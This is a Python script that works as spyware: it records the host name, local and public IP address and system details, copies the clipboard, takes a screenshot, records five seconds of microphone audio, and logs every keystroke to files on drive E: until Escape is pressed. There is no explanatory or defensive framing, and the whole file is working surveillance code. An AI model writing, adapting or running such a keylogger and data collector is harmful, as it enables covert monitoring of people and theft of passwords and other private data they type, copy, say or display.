import platform
import socket
from requests import get
import win32clipboard
from PIL import ImageGrab
from scipy.io.wavfile import write
import sounddevice as sd
from pynput.keyboard import Key,Listener


file="E:\\"
system_info = "syseminfo.txt"
img_info = "screenshot.png"
clip_info = "clipboard.txt"
audio_info= "audio.wav"
key_info="keys.txt"


microphone_time = 5
keys=[]




def computer_info():
    with open(file+system_info,"a")as f:
        hostname=socket.gethostname()
        ippadd=socket.gethostbyname(hostname)

        f.write("Host-Name:" + hostname + "\n")
        f.write("IP-Address:" + ippadd + "\n")

        try:
            public_ip=get("https://api.ipify.org").text
            f.write("\n"+"Public address:"+public_ip)
        except Exception:
            f.write("\n"+"Couldn't get an IP_Address"+"\n")


        f.write("Machine:"+platform.machine()+"\n")
        f.write("Processor:"+platform.processor()+"\n")
        f.write("System:"+platform.system()+"\n")
        f.write("Version:"+platform.version()+"\n")

def copy_clip():
    with open(file+clip_info,"a")as f:
        try:
            win32clipboard.OpenClipboard()
            data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("\n"+"ClipBoard-Data:"+data+"\n")
        except:
            f.write("Clipboard Couldnot be copied")

def screen_shot():
    img=ImageGrab.grab()
    img.save(file+img_info)

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file+ audio_info, fs, myrecording)


def press(key):
    global keys
    keys.append(key)
    write_file(keys)
    keys=[]


def write_file(keys):
    with open(file+key_info,"a")as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\t')

            elif k.find("enter") > 0:
                f.write('\n')

            elif k.find("Key") == -1:
                f.write(k)
    f.close()

def release(key):
    if key == Key.esc:
        return False
computer_info()
copy_clip()
screen_shot()
microphone()
with Listener(on_press=press, on_release=release)as listener:
    listener.join()



